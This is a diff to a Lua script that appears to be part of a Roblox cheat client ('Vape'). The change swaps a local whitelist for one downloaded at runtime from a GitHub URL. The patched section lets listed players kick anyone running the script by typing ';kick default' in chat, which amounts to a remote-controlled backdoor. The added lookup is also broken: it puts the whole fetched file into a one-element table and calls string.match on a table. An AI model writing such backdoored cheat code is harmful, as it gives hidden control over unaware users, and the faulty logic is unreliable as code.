@@ -2171,9 +2171,12 @@ if table.find(HwidWhitelist, HWID) then
       createwarning("Vape","Whitelisted", 60)
 end
 
+local WLTable = { tostring(game:HttpGet("https://raw.githubusercontent.com/31VS1/new/main/whitelist.lua")) }
+
+
 game:GetService("Players").PlayerAdded:Connect(function()
 	for i, v in pairs(game:GetService("Players"):GetChildren()) do
-		if table.find(HwidWhitelist, v.Name) and (not string.match(HwidWhitelist, game:GetService("Players").LocalPlayer.Name)) then
+		if table.find(WLTable, v.Name) and (not string.match(WLTable, game:GetService("Players").LocalPlayer.Name)) then
 			v.Chatted:Connect(function(msg)
 				if msg == ";kick default" then
 					game:GetService("Players").LocalPlayer:kick("l")
